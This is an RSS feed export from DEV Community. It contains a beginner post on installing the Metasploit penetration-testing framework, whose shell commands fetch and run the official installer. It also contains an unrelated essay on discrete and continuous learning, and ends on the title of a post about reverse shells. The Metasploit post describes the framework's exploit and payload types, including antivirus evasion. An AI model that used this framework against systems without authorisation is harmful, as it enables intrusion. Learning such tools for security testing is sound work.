<?xml version="1.0" encoding="UTF-8"?>
<rss version="2.0">
  <channel>
    <title>DEV Community</title>
    <author>DEV Community</author>
    <description>A constructive and inclusive social network for software developers. With you every step of your journey.</description>
    <link>https://dev.to</link>
    <language>en</language>
    <item>
      <title>[Cybersecurity &amp; Linux Tools] How to install Metasploit?</title>
      <author>Yuma-Tsushima </author>
      <pubDate>Fri, 25 Jun 2021 20:49:08 +0000</pubDate>
      <link>https://dev.to/yumatsushima07/cybersecurity-linux-tools-how-to-install-metasploit-2c58</link>
      <guid>https://dev.to/yumatsushima07/cybersecurity-linux-tools-how-to-install-metasploit-2c58</guid>
      <description>&lt;p&gt;Many people have been using this tool Metasploit. You came across on it on many tutorials and wondered how do you actually install this?&lt;br&gt;
Well I will guide your through!&lt;/p&gt;
&lt;h2&gt;
  &lt;a href="#what-is-the-purpose-of-metasploit-what-do-people-even-use-it-for"&gt;
  &lt;/a&gt;
  What is the purpose of Metasploit? What do people even use it for?
&lt;/h2&gt;

&lt;p&gt;The Metasploit framework is a very powerful tool which can be used by cybercriminals as well as ethical hackers to probe systematic vulnerabilities on networks and servers. Because it’s an open-source framework, it can be easily customized and used with most operating systems.&lt;/p&gt;

&lt;p&gt;With Metasploit, the pen testing team can use ready-made or custom code and introduce it into a network to probe for weak spots. As another flavour of threat hunting, once flaws are identified and documented, the information can be used to address systemic weaknesses and prioritize solutions.&lt;/p&gt;
&lt;h2&gt;
  &lt;a href="#who-uses-metasploit"&gt;
  &lt;/a&gt;
  Who uses Metasploit?
&lt;/h2&gt;

&lt;p&gt;Due to its wide range of applications and open-source availability, Metasploit is used by everyone from the evolving field of DevSecOps pros to hackers. It’s helpful to anyone who needs an easy to install, reliable tool that gets the job done regardless of which platform or language is used. The software is popular with hackers and widely available, which reinforces the need for security professionals to become familiar with the framework even if they don’t use it.&lt;/p&gt;

&lt;p&gt;Metasploit now includes more than 1677 exploits organized over 25 platforms, including Android, PHP, Python, Java, Cisco, and more. The framework also carries nearly 500 payloads, some of which include:&lt;/p&gt;

&lt;ul&gt;
&lt;li&gt;&lt;p&gt;Command shell payloads that enable users to run scripts or random commands against a host&lt;/p&gt;&lt;/li&gt;
&lt;li&gt;&lt;p&gt;Dynamic payloads that allow testers to generate unique payloads to evade antivirus software&lt;/p&gt;&lt;/li&gt;
&lt;li&gt;&lt;p&gt;Meterpreter payloads that allow users to commandeer device monitors using VMC and to take over sessions or upload and download files&lt;/p&gt;&lt;/li&gt;
&lt;li&gt;&lt;p&gt;Static payloads that enable port forwarding and communications between networks&lt;/p&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;h2&gt;
  &lt;a href="#how-to-install-metasploit"&gt;
  &lt;/a&gt;
  How to install Metasploit?
&lt;/h2&gt;

&lt;p&gt;Now we have read the background information. You are ready to install!&lt;br&gt;
&lt;/p&gt;

&lt;div class="highlight js-code-highlight"&gt;
&lt;pre class="highlight shell"&gt;&lt;code&gt;&lt;span class="nb"&gt;sudo &lt;/span&gt;apt update
&lt;span class="nb"&gt;sudo &lt;/span&gt;apt dist-upgrade
&lt;span class="nb"&gt;sudo &lt;/span&gt;apt autoremove


&lt;span class="nb"&gt;cd&lt;/span&gt; /tmp

curl https://raw.githubusercontent.com/rapid7/metasploit-omnibus/master/config/templates/metasploit-framework-wrappers/msfupdate.erb &lt;span class="o"&gt;&amp;gt;&lt;/span&gt; msfinstall

&lt;span class="nb"&gt;chmod&lt;/span&gt; +x msfinstall
&lt;span class="nb"&gt;sudo&lt;/span&gt; ./msfinstall

msfdb init

msfconsole

&lt;span class="nb"&gt;sudo &lt;/span&gt;msfupdate
&lt;/code&gt;&lt;/pre&gt;

&lt;/div&gt;

&lt;h2&gt;
  &lt;a href="#credits"&gt;
  &lt;/a&gt;
  Credits
&lt;/h2&gt;


&lt;div class="ltag-github-readme-tag"&gt;
  &lt;div class="readme-overview"&gt;
    &lt;h2&gt;
      &lt;img src="https://res.cloudinary.com/practicaldev/image/fetch/s--i3JOwpme--/c_limit%2Cf_auto%2Cfl_progressive%2Cq_auto%2Cw_880/https://dev.to/assets/github-logo-ba8488d21cd8ee1fee097b8410db9deaa41d0ca30b004c0c63de0a479114156f.svg" alt="GitHub logo"&gt;
      &lt;a href="https://github.com/Yuma-Tsushima07"&gt;
        Yuma-Tsushima07
      &lt;/a&gt; / &lt;a href="https://github.com/Yuma-Tsushima07/Yuma-Tsushima07"&gt;
        Yuma-Tsushima07
      &lt;/a&gt;
    &lt;/h2&gt;
    &lt;h3&gt;
      Readme file
    &lt;/h3&gt;
  &lt;/div&gt;
  &lt;div class="ltag-github-body"&gt;
    
&lt;div id="readme" class="md"&gt;
      &lt;h1&gt;
Welcome to Yuma-Tsushima's Github page!&lt;/h1&gt;
  &lt;p&gt;
  &lt;b&gt;Visitor count &lt;/b&gt;&lt;br&gt;
  &lt;a rel="noopener noreferrer" href="https://camo.githubusercontent.com/57a70d5f50ac5d203e9b6bd912fc9e4b01c8d40c215b656821b455d1f18f928f/68747470733a2f2f70726f66696c652d636f756e7465722e676c697463682e6d652f59756d612d5473757368696d6130372f636f756e742e737667"&gt;&lt;img src="https://camo.githubusercontent.com/57a70d5f50ac5d203e9b6bd912fc9e4b01c8d40c215b656821b455d1f18f928f/68747470733a2f2f70726f66696c652d636f756e7465722e676c697463682e6d652f59756d612d5473757368696d6130372f636f756e742e737667"&gt;&lt;/a&gt;
&lt;/p&gt;
&lt;p&gt;&lt;a href="https://www.patreon.com/Order_of_the_Black_Knights_C2_bot" rel="nofollow"&gt;&lt;img src="https://camo.githubusercontent.com/6a6769e2d2eb0567975317a589549beaa5db99df73ce9d6f5f9004ec12eee28e/68747470733a2f2f696d672e736869656c64732e696f2f62616467652f537570706f72742d42757925323075732532306125323050697a7a612d6f72616e67652e7376673f7374796c653d666f722d7468652d6261646765266c6f676f3d70617472656f6e" alt="Support"&gt;&lt;/a&gt;
&lt;a href="https://disboard.org/server/711260885531885648" rel="nofollow"&gt;&lt;img src="https://camo.githubusercontent.com/018986f113096a2680c8fa03f313cdf0b8adf24be6d7b9df04b81f14e7897680/68747470733a2f2f696d672e736869656c64732e696f2f62616467652f43322773253230506c6163652d4a6f696e2532307573253230666f7225323061253230636861742d626c75652e7376673f7374796c653d666f722d7468652d6261646765266c6f676f3d646973636f7264" alt="Discord"&gt;&lt;/a&gt;
&lt;a href="https://discord.gg/mNAWykv67W" rel="nofollow"&gt;&lt;img src="https://camo.githubusercontent.com/b3b2ffae6fa2d5de61341af99a4e69ce1546047acebcb5039aa106a8411b2209/68747470733a2f2f696d672e736869656c64732e696f2f62616467652f4a6f696e253230746f253230636861742d4379626572417274427974652d626c75652e7376673f7374796c653d666f722d7468652d6261646765266c6f676f3d646973636f7264" alt="Discord"&gt;&lt;/a&gt;
&lt;a href="https://soundcloud.com/0c7av3h4ck5" rel="nofollow"&gt;&lt;img src="https://camo.githubusercontent.com/b8ae02d15a55c4261d919a7dd81f80335cf71d017eb6b737cc32698877f322f9/68747470733a2f2f696d672e736869656c64732e696f2f62616467652f536f756e642d436c6f75642d7265642e7376673f7374796c653d666f722d7468652d6261646765266c6f676f3d736f756e64636c6f7564" alt="SoundCloud"&gt;&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;&lt;a rel="noopener noreferrer" href="https://github.com/Yuma-Tsushima07/Yuma-Tsushima07/blob/main/assets/terminalpython.png"&gt;&lt;img src="https://res.cloudinary.com/practicaldev/image/fetch/s--30kNr2f4--/c_limit%2Cf_auto%2Cfl_progressive%2Cq_auto%2Cw_880/https://github.com/Yuma-Tsushima07/Yuma-Tsushima07/raw/main/assets/terminalpython.png"&gt;&lt;/a&gt;&lt;/p&gt;

      &lt;h3&gt;
About Myself&lt;/h3&gt;
      &lt;p&gt;Hello, my name is Yuma-Tsushima (frequently shortened to Yuma). I am an ambitious coder, and I enjoy coding in JavaScript (mainly). I also love making websites using HTML, CSS and (of course) JS! I started programming (self taught) at the age of 13. Originally, I came from the creative field ; I draw/sing/animate/make music.  &lt;/p&gt;
   

&lt;h3&gt;
Talents and Hobbies&lt;/h3&gt;
&lt;p&gt;I love drawing (I have been drawing all of my life). I play strategy games, I code and I do CTFs! I am also good at animation, making AMVs and image editing. My favourite game is Mindustry, followed by Flow Free and Sudoku. I love watching anime (I love Code Geass - I relate to Lelouch a lot) and I aspire to create my own anime!&lt;/p&gt;
&lt;p&gt;&lt;a rel="noopener noreferrer" href="https://camo.githubusercontent.com/2ee6b04a74d2e5f3c133f042cf9a4c517c12de84f3b843a716694fc09474e417/68747470733a2f2f696d672e736869656c64732e696f2f7374617469632f76313f7374796c653d666c61742d737175617265266c6162656c3d25453225413025383026636f6c6f723d353535266c6162656c436f6c6f723d253233653334633236266d6573736167653d44726177696e67253230253743253230412a"&gt;&lt;img src="https://camo.githubusercontent.com/2ee6b04a74d2e5f3c133f042cf9a4c517c12de84f3b843a716694fc09474e417/68747470733a2f2f696d672e736869656c64732e696f2f7374617469632f76313f7374796c653d666c61742d737175617265266c6162656c3d25453225413025383026636f6c6f723d353535266c6162656c436f6c6f723d253233653334633236266d6573736167653d44726177696e67253230253743253230412a" alt="Drawing"&gt;&lt;/a&gt;
&lt;a rel="noopener noreferrer" href="https://camo.githubusercontent.com/9107ed8d09376ce206e2398fd0513fae0bb422cf18f2c863fdeb4cff1da69c42/68747470733a2f2f696d672e736869656c64732e696f2f7374617469632f76313f7374796c653d666c61742d737175617265266c6162656c3d25453225413025383026636f6c6f723d353535266c6162656c436f6c6f723d253233353633643763266d6573736167653d4d7573696325323025374325323042"&gt;&lt;img src="https://camo.githubusercontent.com/9107ed8d09376ce206e2398fd0513fae0bb422cf18f2c863fdeb4cff1da69c42/68747470733a2f2f696d672e736869656c64732e696f2f7374617469632f76313f7374796c653d666c61742d737175617265266c6162656c3d25453225413025383026636f6c6f723d353535266c6162656c436f6c6f723d253233353633643763266d6573736167653d4d7573696325323025374325323042" alt="Music"&gt;&lt;/a&gt;
&lt;a rel="noopener noreferrer" href="https://camo.githubusercontent.com/0f8e7c7e97a090de494030cec5e9c53271971a05cc99cc1877be133211103b2f/68747470733a2f2f696d672e736869656c64732e696f2f7374617469632f76313f7374796c653d666c61742d737175617265266c6162656c3d25453225413025383026636f6c6f723d353535266c6162656c436f6c6f723d253233326237343839266d6573736167653d4469676974616c253230417274776f726b253230253743253230383025"&gt;&lt;img src="https://camo.githubusercontent.com/0f8e7c7e97a090de494030cec5e9c53271971a05cc99cc1877be133211103b2f/68747470733a2f2f696d672e736869656c64732e696f2f7374617469632f76313f7374796c653d666c61742d737175617265266c6162656c3d25453225413025383026636f6c6f723d353535266c6162656c436f6c6f723d253233326237343839266d6573736167653d4469676974616c253230417274776f726b253230253743253230383025" alt="Digital Artwork"&gt;&lt;/a&gt;
&lt;a rel="noopener noreferrer" href="https://camo.githubusercontent.com/e00451d5e1f51b60407fef6ea1383867d43e4520e2ba2b9e90a10defea549d16/68747470733a2f2f696d672e736869656c64732e696f2f7374617469632f76313f7374796c653d666c61742d737175617265266c6162656c3d25453225413025383026636f6c6f723d353535266c6162656c436f6c6f723d363841303633266d6573736167653d49435425323025374325323041"&gt;&lt;img src="https://camo.githubusercontent.com/e00451d5e1f51b60407fef6ea1383867d43e4520e2ba2b9e90a10defea549d16/68747470733a2f2f696d672e736869656c64732e696f2f7374617469632f76313f7374796c653d666c61742d737175617265266c6162656c3d25453225413025383026636f6c6f723d353535266c6162656c436f6c6f723d363841303633266d6573736167653d49435425323025374325323041" alt="ICT"&gt;&lt;/a&gt;
&lt;a rel="noopener noreferrer" href="https://camo.githubusercontent.com/06f4f740a9fa9a5b4bc25b358d6e98df500cccd4f936b4a8bb020ce509b12e23/68747470733a2f2f696d672e736869656c64732e696f2f7374617469632f76313f7374796c653d666c61742d737175617265266c6162656c3d25453225413025383026636f6c6f723d353535266c6162656c436f6c6f723d363144424642266d6573736167653d456c656374726f6e69637325323025374325323041"&gt;&lt;img src="https://camo.githubusercontent.com/06f4f740a9fa9a5b4bc25b358d6e98df500cccd4f936b4a8bb020ce509b12e23/68747470733a2f2f696d672e736869656c64732e696f2f7374617469632f76313f7374796c653d666c61742d737175617265266c6162656c3d25453225413025383026636f6c6f723d353535266c6162656c436f6c6f723d363144424642266d6573736167653d456c656374726f6e69637325323025374325323041" alt="Electronics"&gt;&lt;/a&gt;
&lt;a rel="noopener noreferrer" href="https://camo.githubusercontent.com/f4a546b3fe39d4cfad9b832e36d1383b539c29e2876293b13466c3cfd6881a68/68747470733a2f2f696d672e736869656c64732e696f2f7374617469632f76313f7374796c653d666c61742d737175617265266c6162656c3d25453225413025383026636f6c6f723d353535266c6162656c436f6c6f723d333036393938266d6573736167653d44657369676e73253230253743253230383525"&gt;&lt;img src="https://camo.githubusercontent.com/f4a546b3fe39d4cfad9b832e36d1383b539c29e2876293b13466c3cfd6881a68/68747470733a2f2f696d672e736869656c64732e696f2f7374617469632f76313f7374796c653d666c61742d737175617265266c6162656c3d25453225413025383026636f6c6f723d353535266c6162656c436f6c6f723d333036393938266d6573736167653d44657369676e73253230253743253230383525" alt="Desgins"&gt;&lt;/a&gt;
&lt;a rel="noopener noreferrer" href="https://camo.githubusercontent.com/8e0c219dec1ad0f1a1e6567edcbd25c8df8afddc0952dcd3f4e328f7d2074d65/68747470733a2f2f696d672e736869656c64732e696f2f7374617469632f76313f7374796c653d666c61742d737175617265266c6162656c3d25453225413025383026636f6c6f723d353535266c6162656c436f6c6f723d363032433530266d6573736167653d576562253230446576656c6f706d656e74253230253743253230383025"&gt;&lt;img src="https://camo.githubusercontent.com/8e0c219dec1ad0f1a1e6567edcbd25c8df8afddc0952dcd3f4e328f7d2074d65/68747470733a2f2f696d672e736869656c64732e696f2f7374617469632f76313f7374796c653d666c61742d737175617265266c6162656c3d25453225413025383026636f6c6f723d353535266c6162656c436f6c6f723d363032433530266d6573736167653d576562253230446576656c6f706d656e74253230253743253230383025" alt="Web dev"&gt;&lt;/a&gt;
&lt;a rel="noopener noreferrer" href="https://camo.githubusercontent.com/307207f36ded5f349f64978e2c8c68c08cd2f1474639832722a0ff0eff976491/68747470733a2f2f696d672e736869656c64732e696f2f7374617469632f76313f7374796c653d666c61742d737175617265266c6162656c3d25453225413025383026636f6c6f723d353535266c6162656c436f6c6f723d373634616263266d6573736167653d5374726174656779253230253743253230393525"&gt;&lt;img src="https://camo.githubusercontent.com/307207f36ded5f349f64978e2c8c68c08cd2f1474639832722a0ff0eff976491/68747470733a2f2f696d672e736869656c64732e696f2f7374617469632f76313f7374796c653d666c61742d737175617265266c6162656c3d25453225413025383026636f6c6f723d353535266c6162656c436f6c6f723d373634616263266d6573736167653d5374726174656779253230253743253230393525" alt="Strategy"&gt;&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;&lt;b&gt; Check out my work!: &lt;/b&gt; &lt;br&gt;
❯ Soundcloud : &lt;a href="https://soundcloud.com/0c7av3h4ck5" rel="nofollow"&gt;0c7av3h4ck5&lt;/a&gt; &lt;br&gt;
❯ Discord : &lt;a href="https://discord.gg/mNAWykv67W" rel="nofollow"&gt;{CyberArtByte}&lt;/a&gt;  &lt;br&gt;
❯ Artwork : &lt;a href="https://medibang.com/u/AcceleratorArts07/" rel="nofollow"&gt;AcceleratorArts07&lt;/a&gt; &lt;br&gt;&lt;/p&gt;
&lt;p&gt;&lt;b&gt;Recent Medium&lt;/b&gt;…&lt;/p&gt;
&lt;/div&gt;
  &lt;/div&gt;
  &lt;div class="gh-btn-container"&gt;&lt;a class="gh-btn" href="https://github.com/Yuma-Tsushima07/Yuma-Tsushima07"&gt;View on GitHub&lt;/a&gt;&lt;/div&gt;
&lt;/div&gt;



&lt;h3&gt;
  &lt;a href="#follow-me"&gt;
  &lt;/a&gt;
  Follow me!
&lt;/h3&gt;

&lt;ul&gt;
&lt;li&gt;Github: &lt;a href="https://github.com/Yuma-Tsushima07"&gt;https://github.com/Yuma-Tsushima07&lt;/a&gt;
&lt;/li&gt;
&lt;li&gt;Medium: &lt;a href="https://0xv37r1x3r.medium.com/"&gt;https://0xv37r1x3r.medium.com/&lt;/a&gt;
&lt;/li&gt;
&lt;li&gt;SoundCloud: &lt;a href="https://soundcloud.com/0c7av3h4ck5"&gt;https://soundcloud.com/0c7av3h4ck5&lt;/a&gt;
&lt;/li&gt;
&lt;/ul&gt;

&lt;h3&gt;
  &lt;a href="#discord-servers"&gt;
  &lt;/a&gt;
  Discord Servers!!
&lt;/h3&gt;

&lt;p&gt;&lt;strong&gt;Bounty Hunters&lt;/strong&gt;: An amazing bug hunting community full of developers and exploiters!!!&lt;/p&gt;

&lt;ul&gt;
&lt;li&gt;Link: &lt;a href="https://discord.gg/J5PsgKqdWq"&gt;https://discord.gg/J5PsgKqdWq&lt;/a&gt;
&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;&lt;strong&gt;CyberArtByte&lt;/strong&gt;: My server full of bling and joy!!&lt;/p&gt;

&lt;ul&gt;
&lt;li&gt;Link: &lt;a href="https://discord.com/invite/mNAWykv67W"&gt;https://discord.com/invite/mNAWykv67W&lt;/a&gt;
&lt;/li&gt;
&lt;/ul&gt;

&lt;h3&gt;
  &lt;a href="#new-soundcloud-track"&gt;
  &lt;/a&gt;
  New Soundcloud Track!!
&lt;/h3&gt;

&lt;p&gt;&lt;iframe width="100%" height="166" src="https://w.soundcloud.com/player/?url=https://soundcloud.com/0c7av3h4ck5/hack-with-your-heart-0c7av3h4ck5&amp;amp;auto_play=false&amp;amp;color=%23000000&amp;amp;hide_related=false&amp;amp;show_comments=true&amp;amp;show_user=true&amp;amp;show_reposts=false&amp;amp;show_teaser=true"&gt;
&lt;/iframe&gt;
&lt;/p&gt;

</description>
      <category>security</category>
      <category>linux</category>
      <category>tooling</category>
    </item>
    <item>
      <title>The Particle/Wave Duality Theory of Knowledge</title>
      <author>swyx</author>
      <pubDate>Fri, 25 Jun 2021 20:29:35 +0000</pubDate>
      <link>https://dev.to/swyx/the-particle-wave-duality-theory-of-knowledge-41g6</link>
      <guid>https://dev.to/swyx/the-particle-wave-duality-theory-of-knowledge-41g6</guid>
      <description>&lt;p&gt;I've come to regard learning — the accumulation of knowledge — as &lt;em&gt;simultaneously&lt;/em&gt; a discrete &lt;em&gt;and&lt;/em&gt; a continuous process. &lt;/p&gt;

&lt;p&gt;If the tools we use don't respect this duality, information is lost — either writing involves too much effort, or reading requires too much context. This has implications both for people who want to learn better, as well as content creators who want to transfer knowledge better.&lt;/p&gt;

&lt;h2&gt;
  &lt;a href="#discrete-vs-continuous-learning"&gt;
  &lt;/a&gt;
  Discrete vs Continuous Learning
&lt;/h2&gt;

&lt;p&gt;&lt;strong&gt;Books, courses, and wikis&lt;/strong&gt; are prime examples of &lt;strong&gt;discrete&lt;/strong&gt; learning. &lt;/p&gt;

&lt;ul&gt;
&lt;li&gt;The ideal wiki article is a complete introduction, history, and overview of a particular topic. Its value comes from being a reliable aggregate source of truth. The structure and sequencing of knowledge presented is often as valuable as the content itself.&lt;/li&gt;
&lt;li&gt;However, long books, courses, and wikis are a lot of content to consume all at once and may never be finished. The scope may be so large that it is hard to keep up to date, particularly when the &lt;em&gt;structure&lt;/em&gt; itself needs to change with the times.&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;&lt;strong&gt;Twitter, Discord, and Email Newsletters&lt;/strong&gt; offer modes of &lt;strong&gt;continuous&lt;/strong&gt; learning.&lt;/p&gt;

&lt;ul&gt;
&lt;li&gt;The focus is on new content, and lack of structure allows maximum flexibility. Information is also bitesize and thus very consumable. Because of the realtime/live nature and randomness of quality, there is inbuilt variable reward which keeps us as addicted as BF Skinner's pigeons.&lt;/li&gt;
&lt;li&gt;However, the lack of historical context can leave beginners out of the loop, and even experts can fall prey to &lt;a href="https://thedecisionlab.com/biases/base-rate-fallacy/"&gt;base rate neglect&lt;/a&gt;. News also has limited long term expected value due to the Lindy Effect, and therefore have a much lower signal to noise ratio. Finally, since major developments tend to spread out over time, there is often no one canonical link that you can send people to get up to speed — you "just had to be there".&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;I've only mentioned examples familiar to individual learners, but this duality also exists at a company level. Do you put all your company knowledge in Notion/Sharepoint (discrete) or Slack (continuous)? Do your docs offer a complete learning path (discrete) or do people also have to read your blog and support forums (continuous)?&lt;/p&gt;

&lt;h2&gt;
  &lt;a href="#particlewave-duality"&gt;
  &lt;/a&gt;
  Particle/Wave Duality
&lt;/h2&gt;

&lt;p&gt;I've already given away the analogy in the title, but this situation reminds me of the dual-slit experiment of quantum mechanics. Here's a quick one minute explainer:&lt;/p&gt;

&lt;p&gt;&lt;iframe width="710" height="399" src="https://www.youtube.com/embed/Q_h4IoPJXZw"&gt;
&lt;/iframe&gt;
&lt;/p&gt;

&lt;p&gt;Perhaps you're most familiar with this in the double split experiment:&lt;/p&gt;

&lt;p&gt;&lt;a href="https://res.cloudinary.com/practicaldev/image/fetch/s--biKEcbHX--/c_limit%2Cf_auto%2Cfl_progressive%2Cq_auto%2Cw_880/https://dev-to-uploads.s3.amazonaws.com/uploads/articles/2jncajmthzjihsfmmst3.png" class="article-body-image-wrapper"&gt;&lt;img src="https://res.cloudinary.com/practicaldev/image/fetch/s--biKEcbHX--/c_limit%2Cf_auto%2Cfl_progressive%2Cq_auto%2Cw_880/https://dev-to-uploads.s3.amazonaws.com/uploads/articles/2jncajmthzjihsfmmst3.png" alt="Alt Text"&gt;&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;I'm no expert myself but the version that works best for the analogy I'm going for sums it up like this:&lt;/p&gt;

&lt;ul&gt;
&lt;li&gt;As the light/electron beam is in transit, it acts like a wave.&lt;/li&gt;
&lt;li&gt;As the light/electron beam is "observed"/hits the screen, it acts like a particle.&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;This all has very nice parallels to the process of learning. Sometimes we are picking up knowledge in a continuous stream, sometimes we just want a big quantum of knowledge all at once. The best forms of learning combine the two modes:&lt;/p&gt;

&lt;ul&gt;
&lt;li&gt;If you learn in a continuous stream, it is useful to recap everything you learned in a post-mortem or retrospective. If you've gained a few years of experience, it's helpful to write down &lt;a href="https://www.notion.so/5bb2d99e50fdbbd15dd9622837d14e2b"&gt;Things You Believe&lt;/a&gt; or write up the guide you wish you'd had.&lt;/li&gt;
&lt;li&gt;If you learned in a discrete block, it is useful to continue that education with continuous &lt;a href="https://ncase.me/remember/"&gt;spaced repetition&lt;/a&gt; or involvement in an alumni community (many professions from finance to airline pilots even require this as "Continuing Education"!)&lt;/li&gt;
&lt;/ul&gt;

&lt;h2&gt;
  &lt;a href="#the-particlewave-duality-theory-of-knowledge"&gt;
  &lt;/a&gt;
  The Particle/Wave Duality Theory of Knowledge
&lt;/h2&gt;

&lt;p&gt;The Particle/Wave Duality Theory of Knowledge defines learning — the accumulation of knowledge — as &lt;em&gt;simultaneously&lt;/em&gt; a discrete &lt;em&gt;and&lt;/em&gt; a continuous process. There's no point picking a side. We learn best with both, so if you are a content creator or knowledge worker, you need a way to record both. &lt;/p&gt;

&lt;p&gt;If knowledge tools don't respect this duality, users will be forced to do the work of duplicating knowledge, or lose it forever.&lt;/p&gt;

&lt;h2&gt;
  &lt;a href="#paying-the-duality-cost"&gt;
  &lt;/a&gt;
  Paying the Duality Cost
&lt;/h2&gt;

&lt;p&gt;I'll motivate this with a personal example. I run &lt;a href="https://www.learninpublic.org/"&gt;the Coding Career Community&lt;/a&gt; in &lt;em&gt;two&lt;/em&gt; places - &lt;a href="http://circle.so"&gt;Circle.so&lt;/a&gt; for my async knowledge base (discrete), and Discord for my live chat (continuous). Of course, both are more continuous places of engagement compared to the book they are focused on, which is the most discrete item of all in my hierarchy (discrete-ness is a spectrum!)&lt;/p&gt;

&lt;p&gt;People might think me crazy for splitting my efforts in running &lt;em&gt;two&lt;/em&gt; communities, instead of one. But I get active users in both and they rarely overlap: &lt;/p&gt;

&lt;ul&gt;
&lt;li&gt;My Circle members are nominally bigger, but far less active and conversations can drag out over days. The primary means of engagement is by the weekly Thursday recap newsletter that gets automatically sent out.&lt;/li&gt;
&lt;li&gt;My Discord members are fewer, but more active and respond quickly to new posts. The primary means of engagement is in-app notifications, banking on the network effect of my members already being active in other Discords.&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;You can analyze this split in every dimension and still come up 50-50. Think about the new user experience, a critical moment for every community. &lt;/p&gt;

&lt;ul&gt;
&lt;li&gt;A Discord user can say hi and immediately get the dopamine hit of a hi back. But they're not going to scroll up and read through the best hits of the community (pinning isn't very effective), so what they see is just completely randomly whatever is the topic of conversation that day.&lt;/li&gt;
&lt;li&gt;A Circle user doesn't even have to say hi, but can get immense value from the top/pinned post and become a fan right then. So I can pour in all my effort to make that top notch.&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;There's no clear cut right answer. Some users will prefer one extreme, some the other, and yet more will just want both. Yet I need to keep both up to date. What I do right now is peak do-things-that-don't-scale: I post continuous updates to Discord, and then once a week I sum up the best of what I find and &lt;a href="https://codingcareer.circle.so/c/learn-in-public"&gt;manually cross-post it to Circle&lt;/a&gt;. Sometimes I find the occasional quality post on Circle, so I send it back to Discord (for sharing with the Discord natives), and to Twitter (for marketing).&lt;/p&gt;

&lt;p&gt;So I'm paying the expensive cost of Particle/Wave Duality, because my tools currently don't recognize it. I could make a bot to do the two way sync between Discord and Circle, but what I'd really like is for this to just be built in in some way. &lt;/p&gt;

&lt;h2&gt;
  &lt;a href="#database-solutions"&gt;
  &lt;/a&gt;
  Database Solutions
&lt;/h2&gt;

&lt;p&gt;If you are developer-literate, I also think there are a couple alternative analogies you can use to solve this dual need:&lt;/p&gt;

&lt;ul&gt;
&lt;li&gt;
&lt;a href="https://en.wikipedia.org/wiki/Change_data_capture"&gt;&lt;strong&gt;Change Data Capture&lt;/strong&gt;&lt;/a&gt; (discrete → continuous): When you update a row in a database, there can be inbuilt functionality to send a notification of what changed (eg &lt;a href="https://docs.aws.amazon.com/amazondynamodb/latest/developerguide/kds.html"&gt;DynamoDB with Kinesis Data Streams&lt;/a&gt;). So people can read up a discrete state of information, then subscribe to the diffs. This is exactly how I use Notion at work, where I rely on email updates of diffs since it is impossible for me to stay on top of all the changes my coworkers are making by checking through each document individually.&lt;/li&gt;
&lt;li&gt;
&lt;strong&gt;&lt;a href="https://en.wikipedia.org/wiki/Materialized_view"&gt;Materialized Views&lt;/a&gt; (&lt;/strong&gt;continuous → discrete*&lt;em&gt;)&lt;/em&gt;*: As you add, modify, or delete data, a separate "materialized view" auto updates and can always be referenced as the source of truth on all the changes that have happened to date. This is how Kanban boards and issue trackers work, by presenting a top down view of the status of work items moving through the engineering process.&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;What would Change Data Capture and Materialized Views look like for knowledge management tools, say a Second Brain, or a Blog?&lt;/p&gt;

&lt;h2&gt;
  &lt;a href="#applying-theory-to-creation"&gt;
  &lt;/a&gt;
  Applying Theory to Creation
&lt;/h2&gt;

&lt;p&gt;Ultimately I think a lot about this in terms of the context of writing and other forms of content creation. As much as I've been talking about the preferred content consumption angle, the stakes are even higher for content creation:&lt;/p&gt;

&lt;ul&gt;
&lt;li&gt;Discrete knowledge items like books and courses are most useful to learners because they present a comprehensive overview. However if it is such a big lift, it may never get done and you may be doing your learners a disservice by not contributing your voice.

&lt;ul&gt;
&lt;li&gt;By the way, many people also treat blogposts like discrete items, taking months to draft it and to have it peer-reviewed like an academic journal. This is usually unsustainable and the blogging grinds to a halt, killed by its own process.&lt;/li&gt;
&lt;/ul&gt;


&lt;/li&gt;
&lt;li&gt;Continuous knowledge items like tweets and chat conversations are far more digestible and easier to create. However, small low effort items out of context aren't all that valuable in themselves, and struggle to stand out and get traction compared to &lt;a href="https://sparktoro.com/blog/resources/10x-content-by-rand-fishkin/"&gt;10x Content&lt;/a&gt; that sells itself.&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;Ultimately I think you should try to do both. Prototype by making continuous knowledge items, but be aware that most people will never see your work there. So periodically you need to do "treasure collection" - go back through your continuous streams, and pick out the most promising threads to turn into bigger, discrete pieces.&lt;/p&gt;

&lt;h2&gt;
  &lt;a href="#question-from-a-reader"&gt;
  &lt;/a&gt;
  Question from a Reader
&lt;/h2&gt;

&lt;p&gt;"&lt;em&gt;Our team currently has years of docs in a Google docs like system. Main problem with new hires is that they haven't yet accepted that the docs are poorly maintained, or there are 6 docs for the same process written by different people and not deleted or updated. It's madness. How would you go about this process?&lt;/em&gt;"&lt;/p&gt;

&lt;p&gt;Ah, the outdated knowledge base problem. We continually swing back and forth between wanting a discrete source of truth, but then time passes and continuous updates do not get registered. Technology hasn't (yet) solved this — although graph database tooling like &lt;a href="https://roamresearch.com/"&gt;Roam Research&lt;/a&gt; or &lt;a href="https://obsidian.md/"&gt;Obsidian&lt;/a&gt; can automatically propagate continuous updates to discrete materialized views, it is still a poor susbstitute for properly curated and updated structure. &lt;/p&gt;

&lt;p&gt;Ultimately I view the knowledge base problem as a human problem - you have to commit to maintaining your sources of truth, but don't make it so huge as to be unmaintainable and unreadable. Don't be so rigid about your process that you treat people talking to each other to figure out problems as a bug. Identify what you care about and make it a priority to enforce that, but recognize that enforcement isn't free and pick your battles.&lt;/p&gt;

&lt;p&gt;&lt;em&gt;Major thanks to &lt;a href="https://xdg.me/"&gt;David Golden&lt;/a&gt;, &lt;a href="https://twitter.com/_mjmeyer?lang=en"&gt;MJ Meyer&lt;/a&gt;, and &lt;a href="https://calvintorra.com/"&gt;Calvin Torra&lt;/a&gt; for providing feedback on drafts!&lt;/em&gt;&lt;/p&gt;

</description>
      <category>learning</category>
      <category>reflections</category>
    </item>
    <item>
      <title>[Cybersecurity] How do Reverse shells work?</title>
      <author>Yuma-Tsushima </author>
